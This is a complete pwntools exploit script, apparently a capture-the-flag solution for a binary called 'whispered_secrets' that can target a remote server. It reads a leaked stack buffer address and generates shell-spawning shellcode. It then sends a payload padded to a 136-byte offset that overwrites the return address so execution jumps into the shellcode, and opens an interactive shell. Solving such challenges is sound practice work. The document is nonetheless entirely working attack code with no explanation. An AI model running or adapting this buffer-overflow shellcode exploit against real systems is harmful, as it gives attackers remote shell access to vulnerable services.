#!/usr/bin/env python3
from pwn import *

exe = ELF("whispered_secrets")
context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

OFFSET_TO_RIP = 136

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("offsec.m0lecon.it", 13545)
    return r

def main():
    r = conn()

    # parse the leaked buffer address
    leak_line = r.recvline_contains(b"secret:")
    buf_addr = int(leak_line.split(b"secret: ")[1].strip(), 16)
    log.info(f"buf = {buf_addr:#x}")

    # generate shellcode that spawns /bin/sh
    shellcode = asm(shellcraft.sh())

    payload = flat(
        shellcode,  # machine code at the start of buf
        b'A' * (OFFSET_TO_RIP - len(shellcode)),  # padding to reach RIP
        p64(buf_addr),  # overwrite RIP with buf address
    )

    r.sendafter(b"secret:\n", payload)
    r.interactive()

if __name__ == "__main__":
    main()